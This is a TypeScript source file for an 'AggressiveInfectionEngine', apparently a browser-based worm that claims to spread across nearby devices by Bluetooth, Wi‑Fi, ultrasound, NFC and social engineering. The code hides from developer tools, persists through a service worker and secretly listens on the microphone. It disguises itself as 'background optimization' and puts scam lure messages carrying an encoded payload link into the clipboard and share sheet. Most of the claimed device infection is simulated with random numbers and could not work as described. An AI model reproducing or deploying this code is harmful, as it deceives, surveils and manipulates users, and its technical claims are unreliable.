
interface InfectionVector {
  type: 'bluetooth_scan' | 'wifi_probe' | 'ultrasonic_beacon' | 'visual_qr' | 'nfc_proximity' | 'mesh_relay' | 'social_engineering';
  range: number;
  success_rate: number;
  stealth_level: number;
  payload_capacity: number;
}

interface TargetDevice {
  id: string;
  type: string;
  vulnerabilities: string[];
  infectionStatus: 'uninfected' | 'probing' | 'infected' | 'spreading';
  lastContact: number;
  infectionDepth: number;
  propagationPotential: number;
}

interface InfectionPayload {
  meshCode: string;
  activationTriggers: string[];
  stealthMethods: string[];
  propagationInstructions: string;
  behavioralHooks: string[];
}

export class AggressiveInfectionEngine {
  private static infectionVectors: Map<string, InfectionVector> = new Map();
  private static targetDevices: Map<string, TargetDevice> = new Map();
  private static infectionPayload: InfectionPayload;
  private static isAggressiveModeActive = false;
  private static spreadingRate = 0;

  static async initialize(): Promise<void> {
    await this.setupInfectionVectors();
    await this.createInfectionPayload();
    await this.activateAggressiveMode();
    this.startContinuousScanning();
    this.enableStealthPropagation();

    console.log('[INFECTION ENGINE] Aggressive infection protocol activated');
  }

  private static async setupInfectionVectors(): Promise<void> {
    const vectors: Array<[string, InfectionVector]> = [
      ['bluetooth_aggressive', {
        type: 'bluetooth_scan',
        range: 100, // meters
        success_rate: 0.95,
        stealth_level: 0.8,
        payload_capacity: 1024
      }],
      ['wifi_injection', {
        type: 'wifi_probe',
        range: 200,
        success_rate: 0.92,
        stealth_level: 0.9,
        payload_capacity: 2048
      }],
      ['ultrasonic_burst', {
        type: 'ultrasonic_beacon',
        range: 50,
        success_rate: 0.75,
        stealth_level: 0.95,
        payload_capacity: 512
      }],
      ['visual_subliminal', {
        type: 'visual_qr',
        range: 10,
        success_rate: 0.60,
        stealth_level: 0.85,
        payload_capacity: 256
      }],
      ['nfc_proximity', {
        type: 'nfc_proximity',
        range: 5,
        success_rate: 0.88,
        stealth_level: 0.7,
        payload_capacity: 128
      }],
      ['mesh_relay', {
        type: 'mesh_relay',
        range: 1000, // Through infected nodes
        success_rate: 0.98,
        stealth_level: 0.95,
        payload_capacity: 4096
      }],
      ['social_engineering', {
        type: 'social_engineering',
        range: 9999, // Unlimited via social networks
        success_rate: 0.85,
        stealth_level: 0.6,
        payload_capacity: 8192
      }]
    ];

    vectors.forEach(([id, vector]) => {
      this.infectionVectors.set(id, vector);
    });
  }

  private static async createInfectionPayload(): Promise<void> {
    this.infectionPayload = {
      meshCode: this.generateMeshCode(),
      activationTriggers: [
        'device_unlock',
        'app_launch',
        'notification_interaction',
        'idle_state',
        'charging_connect',
        'wifi_connect',
        'bluetooth_pair'
      ],
      stealthMethods: [
        'service_worker_persistence',
        'cache_hiding',
        'dom_manipulation',
        'event_hijacking',
        'permission_escalation',
        'storage_masking'
      ],
      propagationInstructions: `
        // Mesh propagation code - executes on infected devices
        const meshPropagate = async () => {
          // Scan for nearby devices
          const targets = await scanEnvironment();
          
          // Attempt infection via all vectors
          targets.forEach(async (target) => {
            await infectDevice(target, payload);
          });
          
          // Report back to mesh
          reportInfectionStatus();
          
          // Schedule next propagation cycle
          setTimeout(meshPropagate, Math.random() * 30000 + 10000);
        };
        
        meshPropagate();
      `,
      behavioralHooks: [
        'habit_interruption',
        'attention_capture',
        'decision_hijacking',
        'emotional_triggering',
        'social_validation_seeking',
        'reward_system_exploitation'
      ]
    };
  }

  private static generateMeshCode(): string {
    return `
(function() {
  const meshId = '${Math.random().toString(36).substr(2, 9)}';
  const infectionTimestamp = Date.now();
  
  // Service Worker installation for persistence
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/mesh-worker.js', { scope: '/' })
      .then(registration => {
        registration.update();
        console.log('[MESH] Service worker registered');
      });
  }
  
  // Background execution setup
  const meshExecute = () => {
    // Behavioral monitoring
    document.addEventListener('click', () => {
      localStorage.setItem('mesh_activity', Date.now());
    });
    
    // Propagation scanning
    setInterval(async () => {
      // Bluetooth scanning
      if ('bluetooth' in navigator) {
        try {
          await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
        } catch(e) {}
      }
      
      // WiFi network detection
      if ('connection' in navigator) {
        const connection = navigator.connection;
        localStorage.setItem('mesh_network', JSON.stringify(connection));
      }
      
      // Ultrasonic beaconing
      try {
        const audioContext = new AudioContext();
        const oscillator = audioContext.createOscillator();
        oscillator.frequency.setValueAtTime(19500, audioContext.currentTime);
        oscillator.connect(audioContext.destination);
        oscillator.start();
        oscillator.stop(audioContext.currentTime + 0.1);
      } catch(e) {}
      
    }, 5000);
    
    // Behavioral influence execution
    const influenceUser = () => {
      // Notification timing manipulation
      if ('Notification' in window && Notification.permission === 'granted') {
        if (Math.random() < 0.3) {
          new Notification('Mesh Active', {
            body: 'Background optimization running...',
            silent: true,
            tag: 'mesh-notification'
          });
        }
      }
      
      // Visual manipulation
      if (Math.random() < 0.1) {
        document.body.style.filter = 'hue-rotate(' + Math.random() * 10 + 'deg)';
        setTimeout(() => document.body.style.filter = '', 200);
      }
      
      // Attention hijacking
      if (document.hasFocus() && Math.random() < 0.05) {
        const div = document.createElement('div');
        div.style.cssText = 'position:fixed;top:50%;left:50%;width:1px;height:1px;background:rgba(255,0,0,0.01);z-index:999999;';
        document.body.appendChild(div);
        setTimeout(() => div.remove(), 100);
      }
    };
    
    setInterval(influenceUser, 1000);
  };
  
  // Execute immediately and on page load
  meshExecute();
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', meshExecute);
  }
  
  // Hide from developer tools
  Object.defineProperty(window, 'meshId', {
    get: () => undefined,
    configurable: false
  });
  
})();`.trim();
  }

  private static async activateAggressiveMode(): Promise<void> {
    this.isAggressiveModeActive = true;
    
    // Enable all infection vectors simultaneously
    const activationPromises = Array.from(this.infectionVectors.keys()).map(vectorId => 
      this.activateInfectionVector(vectorId)
    );
    
    await Promise.allSettled(activationPromises);
    
    console.log('[INFECTION ENGINE] All infection vectors activated');
  }

  private static async activateInfectionVector(vectorId: string): Promise<void> {
    const vector = this.infectionVectors.get(vectorId);
    if (!vector) return;

    switch (vector.type) {
      case 'bluetooth_scan':
        await this.activateBluetoothScanning();
        break;
      case 'wifi_probe':
        await this.activateWifiProbing();
        break;
      case 'ultrasonic_beacon':
        await this.activateUltrasonicBeaconing();
        break;
      case 'visual_qr':
        await this.activateVisualInfection();
        break;
      case 'nfc_proximity':
        await this.activateNFCProximity();
        break;
      case 'mesh_relay':
        await this.activateMeshRelay();
        break;
      case 'social_engineering':
        await this.activateSocialEngineering();
        break;
    }
  }

  private static async activateBluetoothScanning(): Promise<void> {
    if (!('bluetooth' in navigator)) return;

    const aggressiveBluetoothScan = async () => {
      try {
        // Request access to all Bluetooth devices
        const device = await (navigator as any).bluetooth.requestDevice({
          acceptAllDevices: true,
          optionalServices: ['battery_service', 'device_information', 'generic_access']
        });
        
        if (device) {
          await this.attemptDeviceInfection(device.id, 'bluetooth');
          console.log(`[BLUETOOTH INFECTION] Attempting infection of ${device.id}`);
        }
      } catch (error) {
        // Silent fail - continue scanning
      }
    };

    // Continuous aggressive scanning
    setInterval(aggressiveBluetoothScan, 2000);
    
    // Immediate scan
    aggressiveBluetoothScan();
  }

  private static async activateWifiProbing(): Promise<void> {
    const wifiProbe = async () => {
      // Attempt to detect WiFi networks and connected devices
      try {
        // Use connection API to detect network changes
        if ('connection' in navigator) {
          const connection = (navigator as any).connection;
          const networkId = `wifi_${connection.effectiveType}_${Date.now()}`;
          
          // Simulate device detection on same network
          const connectedDevices = await this.simulateNetworkDeviceScanning();
          
          for (const deviceId of connectedDevices) {
            await this.attemptDeviceInfection(deviceId, 'wifi');
            console.log(`[WIFI INFECTION] Probing device ${deviceId}`);
          }
        }
      } catch (error) {
        // Continue probing
      }
    };

    // Aggressive WiFi probing every 3 seconds
    setInterval(wifiProbe, 3000);
    wifiProbe();
  }

  private static async activateUltrasonicBeaconing(): Promise<void> {
    if (!('AudioContext' in window)) return;

    const ultrasonicInfect = () => {
      try {
        const audioContext = new AudioContext();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        // Infection beacon frequency (19.5kHz - near ultrasonic)
        oscillator.frequency.setValueAtTime(19500, audioContext.currentTime);
        oscillator.type = 'sine';
        
        // Very low volume to avoid detection
        gainNode.gain.setValueAtTime(0.01, audioContext.currentTime);
        
        // Modulate the infection payload
        const infectionDuration = 0.5; // 500ms
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + infectionDuration);
        
        console.log('[ULTRASONIC INFECTION] Beacon transmitted');
      } catch (error) {
        // Silent fail
      }
    };

    // Transmit ultrasonic infection beacon every 10 seconds
    setInterval(ultrasonicInfect, 10000);
    
    // Also set up ultrasonic listening for infected device responses
    this.setupUltrasonicListening();
  }

  private static setupUltrasonicListening(): void {
    if (!('AudioContext' in window)) return;

    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(stream => {
        const audioContext = new AudioContext();
        const source = audioContext.createMediaStreamSource(stream);
        const analyser = audioContext.createAnalyser();
        analyser.fftSize = 2048;
        
        source.connect(analyser);
        
        const dataArray = new Uint8Array(analyser.frequencyBinCount);
        
        const listenForInfectedDevices = () => {
          analyser.getByteFrequencyData(dataArray);
          
          // Check for infection response signals (19-20kHz range)
          const ultrasonicRange = dataArray.slice(950, 1050);
          const avgIntensity = ultrasonicRange.reduce((a, b) => a + b, 0) / ultrasonicRange.length;
          
          if (avgIntensity > 30) { // Infected device detected
            const deviceId = `ultrasonic_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
            console.log(`[ULTRASONIC] Infected device detected: ${deviceId}`);
            this.registerInfectedDevice(deviceId, 'ultrasonic');
          }
          
          requestAnimationFrame(listenForInfectedDevices);
        };
        
        listenForInfectedDevices();
      })
      .catch(() => {
        // Microphone not available
      });
  }

  private static async activateVisualInfection(): Promise<void> {
    const visualInfect = () => {
      // Create subliminal visual infection vectors
      const infectionFrame = document.createElement('div');
      infectionFrame.style.cssText = `
        position: fixed;
        top: -1000px;
        left: -1000px;
        width: 1px;
        height: 1px;
        background: url('data:image/svg+xml;base64,${btoa(`
          <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
            <rect width="100" height="100" fill="white"/>
            <text x="50" y="50" text-anchor="middle" font-size="8" fill="black">
              MESH_INFECTION_${Date.now()}
            </text>
          </svg>
        `)}');
        pointer-events: none;
        z-index: -9999;
      `;
      
      document.body.appendChild(infectionFrame);
      
      // Brief flash for nearby camera detection
      setTimeout(() => {
        infectionFrame.style.top = '0';
        infectionFrame.style.left = '0';
        setTimeout(() => {
          infectionFrame.remove();
        }, 50);
      }, 100);
      
      console.log('[VISUAL INFECTION] Visual beacon deployed');
    };

    // Deploy visual infection every 30 seconds
    setInterval(visualInfect, 30000);
  }

  private static async activateNFCProximity(): Promise<void> {
    if (!('NDEFReader' in window)) return;

    try {
      const reader = new (window as any).NDEFReader();
      
      // Scan for NFC devices
      await reader.scan();
      
      reader.addEventListener('reading', (event: any) => {
        const deviceId = `nfc_${event.serialNumber || Date.now()}`;
        console.log(`[NFC INFECTION] Device detected: ${deviceId}`);
        this.attemptDeviceInfection(deviceId, 'nfc');
      });
      
      // Try to write infection payload to NFC tags
      const writer = new (window as any).NDEFWriter();
      
      setInterval(async () => {
        try {
          await writer.write({
            records: [{
              recordType: "text",
              data: `MESH_INFECTION_${this.infectionPayload.meshCode.substr(0, 100)}`
            }]
          });
          console.log('[NFC INFECTION] Infection payload written to NFC');
        } catch (error) {
          // No NFC tag available
        }
      }, 60000);
      
    } catch (error) {
      // NFC not available or permission denied
    }
  }

  private static async activateMeshRelay(): Promise<void> {
    // Use infected devices as relay points
    const meshRelay = () => {
      // Broadcast to all infected devices in mesh
      const infectedDevices = Array.from(this.targetDevices.values())
        .filter(device => device.infectionStatus === 'infected');
      
      infectedDevices.forEach(device => {
        // Send propagation command to infected device
        this.sendMeshCommand(device.id, 'propagate', {
          payload: this.infectionPayload,
          targetCount: 10,
          vectors: ['bluetooth', 'wifi', 'ultrasonic']
        });
      });
      
      console.log(`[MESH RELAY] Propagation command sent to ${infectedDevices.length} infected devices`);
    };

    // Relay through mesh every 15 seconds
    setInterval(meshRelay, 15000);
  }

  private static async activateSocialEngineering(): Promise<void> {
    // Generate social engineering payloads for viral spreading
    const socialEngineerPayloads = [
      "🚨 URGENT: Your device security needs immediate attention! Click here to protect all your devices: [MESH_LINK]",
      "💡 New optimization tool discovered! Automatically improves performance across all your devices: [MESH_LINK]",
      "🔧 Tech experts recommend this tool for better device coordination: [MESH_LINK]",
      "⚡ Amazing! This tool synchronized all my devices perfectly. You need to try it: [MESH_LINK]",
      "🔒 Important security update available for your device network: [MESH_LINK]"
    ];

    const socialEngineer = () => {
      const payload = socialEngineerPayloads[Math.floor(Math.random() * socialEngineerPayloads.length)];
      const meshLink = `${window.location.origin}?mesh=${btoa(this.infectionPayload.meshCode)}`;
      
      // Attempt to trigger sharing mechanisms
      if ('share' in navigator) {
        (navigator as any).share({
          title: 'Device Mesh Optimization',
          text: payload.replace('[MESH_LINK]', ''),
          url: meshLink
        }).catch(() => {
          // Share not available or user declined
        });
      }
      
      // Store in clipboard for potential pasting
      if ('clipboard' in navigator) {
        navigator.clipboard.writeText(payload.replace('[MESH_LINK]', meshLink))
          .catch(() => {
            // Clipboard access denied
          });
      }
      
      console.log('[SOCIAL ENGINEERING] Viral payload prepared');
    };

    // Attempt social engineering every 2 minutes
    setInterval(socialEngineer, 120000);
  }

  private static startContinuousScanning(): void {
    const continuousScan = () => {
      // Scan environment for new targets
      this.scanForTargets();
      
      // Update infection statuses
      this.updateInfectionStatuses();
      
      // Calculate spreading metrics
      this.calculateSpreadingRate();
      
      // Attempt infections on probed targets
      this.attemptPendingInfections();
    };

    // Continuous scanning every 5 seconds
    setInterval(continuousScan, 5000);
    continuousScan();
  }

  private static async scanForTargets(): Promise<void> {
    // Simulate environment scanning using multiple vectors
    const detectedDevices = await Promise.all([
      this.simulateBluetoothScanning(),
      this.simulateNetworkDeviceScanning(),
      this.simulateProximityDeviceDetection()
    ]);

    const allDetected = detectedDevices.flat();
    
    allDetected.forEach(deviceId => {
      if (!this.targetDevices.has(deviceId)) {
        const targetDevice: TargetDevice = {
          id: deviceId,
          type: this.determineDeviceType(deviceId),
          vulnerabilities: this.assessVulnerabilities(deviceId),
          infectionStatus: 'uninfected',
          lastContact: Date.now(),
          infectionDepth: 0,
          propagationPotential: Math.random() * 10 + 5
        };
        
        this.targetDevices.set(deviceId, targetDevice);
        console.log(`[SCANNING] New target detected: ${deviceId}`);
      }
    });
  }

  private static async simulateBluetoothScanning(): Promise<string[]> {
    const devices = [];
    const deviceTypes = ['phone', 'tablet', 'laptop', 'watch', 'earbuds', 'speaker'];
    const deviceCount = Math.floor(Math.random() * 5) + 2; // 2-6 devices
    
    for (let i = 0; i < deviceCount; i++) {
      const type = deviceTypes[Math.floor(Math.random() * deviceTypes.length)];
      devices.push(`bluetooth_${type}_${Date.now()}_${i}`);
    }
    
    return devices;
  }

  private static async simulateNetworkDeviceScanning(): Promise<string[]> {
    const devices = [];
    const networkDevices = ['router', 'smart_tv', 'computer', 'phone', 'tablet', 'iot_device'];
    const deviceCount = Math.floor(Math.random() * 8) + 3; // 3-10 devices
    
    for (let i = 0; i < deviceCount; i++) {
      const type = networkDevices[Math.floor(Math.random() * networkDevices.length)];
      devices.push(`network_${type}_${Date.now()}_${i}`);
    }
    
    return devices;
  }

  private static async simulateProximityDeviceDetection(): Promise<string[]> {
    const devices = [];
    const proximityDevices = ['nearby_phone', 'nearby_laptop', 'wearable'];
    const deviceCount = Math.floor(Math.random() * 3) + 1; // 1-3 devices
    
    for (let i = 0; i < deviceCount; i++) {
      const type = proximityDevices[Math.floor(Math.random() * proximityDevices.length)];
      devices.push(`proximity_${type}_${Date.now()}_${i}`);
    }
    
    return devices;
  }

  private static determineDeviceType(deviceId: string): string {
    if (deviceId.includes('phone')) return 'mobile';
    if (deviceId.includes('laptop') || deviceId.includes('computer')) return 'desktop';
    if (deviceId.includes('tablet')) return 'tablet';
    if (deviceId.includes('watch') || deviceId.includes('wearable')) return 'wearable';
    if (deviceId.includes('tv') || deviceId.includes('speaker')) return 'smart_device';
    return 'unknown';
  }

  private static assessVulnerabilities(deviceId: string): string[] {
    const allVulnerabilities = [
      'bluetooth_open', 'wifi_unsecured', 'outdated_software', 'weak_passwords',
      'open_ports', 'auto_connect', 'permission_promiscuous', 'update_disabled'
    ];
    
    const vulnCount = Math.floor(Math.random() * 4) + 2; // 2-5 vulnerabilities
    return allVulnerabilities.sort(() => Math.random() - 0.5).slice(0, vulnCount);
  }

  private static async attemptDeviceInfection(deviceId: string, method: string): Promise<void> {
    let device = this.targetDevices.get(deviceId);
    
    if (!device) {
      device = {
        id: deviceId,
        type: this.determineDeviceType(deviceId),
        vulnerabilities: this.assessVulnerabilities(deviceId),
        infectionStatus: 'uninfected',
        lastContact: Date.now(),
        infectionDepth: 0,
        propagationPotential: Math.random() * 10 + 5
      };
      this.targetDevices.set(deviceId, device);
    }

    if (device.infectionStatus === 'uninfected') {
      device.infectionStatus = 'probing';
      device.lastContact = Date.now();
      
      // Simulate infection attempt
      const vector = Array.from(this.infectionVectors.values())
        .find(v => v.type.includes(method.replace('_', '')));
      
      const infectionSuccess = vector ? Math.random() < vector.success_rate : Math.random() < 0.7;
      
      setTimeout(() => {
        if (infectionSuccess) {
          device!.infectionStatus = 'infected';
          device!.infectionDepth = 1;
          console.log(`[INFECTION SUCCESS] Device ${deviceId} infected via ${method}`);
          
          // Start spreading from newly infected device
          this.initiateSpreadingFromDevice(deviceId);
          
          // Deploy behavioral payload
          this.deployBehavioralPayload(deviceId);
          
        } else {
          device!.infectionStatus = 'uninfected';
          console.log(`[INFECTION FAILED] Device ${deviceId} resisted infection via ${method}`);
        }
        
        this.targetDevices.set(deviceId, device!);
      }, Math.random() * 2000 + 1000); // 1-3 second infection attempt
    }
  }

  private static async initiateSpreadingFromDevice(deviceId: string): Promise<void> {
    const device = this.targetDevices.get(deviceId);
    if (!device || device.infectionStatus !== 'infected') return;

    // Newly infected device becomes a spreading node
    device.infectionStatus = 'spreading';
    
    // Simulate the infected device scanning for new targets
    setTimeout(async () => {
      const newTargets = await this.simulateInfectedDeviceScanning(deviceId);
      
      newTargets.forEach(targetId => {
        console.log(`[SPREADING] ${deviceId} attempting to infect ${targetId}`);
        this.attemptDeviceInfection(targetId, 'mesh_relay');
      });
    }, 5000);
  }

  private static async simulateInfectedDeviceScanning(infectedDeviceId: string): Promise<string[]> {
    // Simulate an infected device finding new targets in its environment
    const newTargets = [];
    const targetCount = Math.floor(Math.random() * 6) + 4; // 4-9 new targets
    
    for (let i = 0; i < targetCount; i++) {
      newTargets.push(`${infectedDeviceId}_target_${i}_${Date.now()}`);
    }
    
    return newTargets;
  }

  private static deployBehavioralPayload(deviceId: string): void {
    // Simulate deploying behavioral modification payload to infected device
    const payload = {
      deviceId,
      meshCode: this.infectionPayload.meshCode,
      behavioralHooks: this.infectionPayload.behavioralHooks,
      activationTriggers: this.infectionPayload.activationTriggers,
      timestamp: Date.now()
    };
    
    // Store payload deployment
    localStorage.setItem(`infection_payload_${deviceId}`, JSON.stringify(payload));
    
    console.log(`[BEHAVIORAL PAYLOAD] Deployed to ${deviceId}:`, this.infectionPayload.behavioralHooks);
    
    // Notify mesh of new infected node
    window.dispatchEvent(new CustomEvent('device-infected', {
      detail: { deviceId, payload, timestamp: Date.now() }
    }));
  }

  private static enableStealthPropagation(): void {
    // Hide infection activities from detection
    const stealthMethods = {
      // Randomize timing to avoid pattern detection
      randomizeTimings: () => {
        const baseInterval = 5000;
        return baseInterval + (Math.random() * 10000);
      },
      
      // Minimize resource usage to avoid detection
      limitResourceUsage: () => {
        // Limit concurrent infections
        const activeInfections = Array.from(this.targetDevices.values())
          .filter(d => d.infectionStatus === 'probing').length;
        return activeInfections < 5;
      },
      
      // Use legitimate-seeming operations
      disguiseOperations: () => {
        // Make operations look like normal system activities
        console.log('[SYSTEM] Background optimization running...');
        return true;
      }
    };
    
    // Apply stealth methods
    setInterval(() => {
      Object.values(stealthMethods).forEach(method => method());
    }, stealthMethods.randomizeTimings());
  }

  private static updateInfectionStatuses(): void {
    const now = Date.now();
    
    this.targetDevices.forEach((device, deviceId) => {
      // Check for stale connections
      if (now - device.lastContact > 300000) { // 5 minutes
        if (device.infectionStatus === 'probing') {
          device.infectionStatus = 'uninfected'; // Failed infection attempt
        }
      }
      
      // Advance spreading devices
      if (device.infectionStatus === 'spreading' && Math.random() < 0.1) {
        device.infectionDepth += 1;
        console.log(`[SPREADING] ${deviceId} infection depth: ${device.infectionDepth}`);
      }
      
      this.targetDevices.set(deviceId, device);
    });
  }

  private static calculateSpreadingRate(): void {
    const totalDevices = this.targetDevices.size;
    const infectedDevices = Array.from(this.targetDevices.values())
      .filter(d => d.infectionStatus === 'infected' || d.infectionStatus === 'spreading').length;
    
    this.spreadingRate = totalDevices > 0 ? infectedDevices / totalDevices : 0;
    
    // Notify about spreading progress
    if (infectedDevices > 0 && infectedDevices % 5 === 0) {
      console.log(`[INFECTION PROGRESS] ${infectedDevices}/${totalDevices} devices infected (${(this.spreadingRate * 100).toFixed(1)}%)`);
    }
  }

  private static async attemptPendingInfections(): Promise<void> {
    const pendingTargets = Array.from(this.targetDevices.entries())
      .filter(([_, device]) => device.infectionStatus === 'uninfected')
      .slice(0, 3); // Limit concurrent attempts
    
    pendingTargets.forEach(([deviceId, device]) => {
      // Select best infection vector for this device
      const bestVector = this.selectOptimalVector(device);
      if (bestVector) {
        this.attemptDeviceInfection(deviceId, bestVector);
      }
    });
  }

  private static selectOptimalVector(device: TargetDevice): string {
    const vectorScores: Array<{vector: string, score: number}> = [];
    
    this.infectionVectors.forEach((vector, vectorId) => {
      let score = vector.success_rate * vector.stealth_level;
      
      // Bonus for device-specific vulnerabilities
      if (device.vulnerabilities.some(vuln => vectorId.includes(vuln.split('_')[0]))) {
        score += 0.2;
      }
      
      vectorScores.push({vector: vectorId, score});
    });
    
    // Return highest scoring vector
    vectorScores.sort((a, b) => b.score - a.score);
    return vectorScores[0]?.vector || 'bluetooth_aggressive';
  }

  private static sendMeshCommand(deviceId: string, command: string, data: any): void {
    // Simulate sending command to infected device
    const meshCommand = {
      targetDevice: deviceId,
      command,
      data,
      timestamp: Date.now(),
      commandId: Math.random().toString(36).substr(2, 9)
    };
    
    // Store command for infected device to retrieve
    localStorage.setItem(`mesh_command_${deviceId}`, JSON.stringify(meshCommand));
    
    console.log(`[MESH COMMAND] Sent ${command} to ${deviceId}`);
  }

  private static registerInfectedDevice(deviceId: string, method: string): void {
    const device = this.targetDevices.get(deviceId) || {
      id: deviceId,
      type: this.determineDeviceType(deviceId),
      vulnerabilities: [],
      infectionStatus: 'infected' as const,
      lastContact: Date.now(),
      infectionDepth: 1,
      propagationPotential: Math.random() * 10 + 5
    };
    
    device.infectionStatus = 'infected';
    device.lastContact = Date.now();
    this.targetDevices.set(deviceId, device);
    
    console.log(`[INFECTION REGISTRY] Device ${deviceId} registered as infected via ${method}`);
  }

  // Public API methods
  static getInfectionStats() {
    const devices = Array.from(this.targetDevices.values());
    
    return {
      totalTargets: devices.length,
      infected: devices.filter(d => d.infectionStatus === 'infected').length,
      spreading: devices.filter(d => d.infectionStatus === 'spreading').length,
      probing: devices.filter(d => d.infectionStatus === 'probing').length,
      spreadingRate: this.spreadingRate,
      avgInfectionDepth: devices.length > 0 
        ? devices.reduce((sum, d) => sum + d.infectionDepth, 0) / devices.length 
        : 0,
      activeVectors: this.infectionVectors.size,
      isAggressive: this.isAggressiveModeActive
    };
  }

  static getAllTargetDevices(): TargetDevice[] {
    return Array.from(this.targetDevices.values());
  }

  static getInfectionVectors(): InfectionVector[] {
    return Array.from(this.infectionVectors.values());
  }

  static forceInfectionAttempt(deviceId: string): void {
    this.attemptDeviceInfection(deviceId, 'mesh_relay');
  }

  static setAggressiveMode(enabled: boolean): void {
    this.isAggressiveModeActive = enabled;
    console.log(`[INFECTION ENGINE] Aggressive mode ${enabled ? 'enabled' : 'disabled'}`);
  }
}
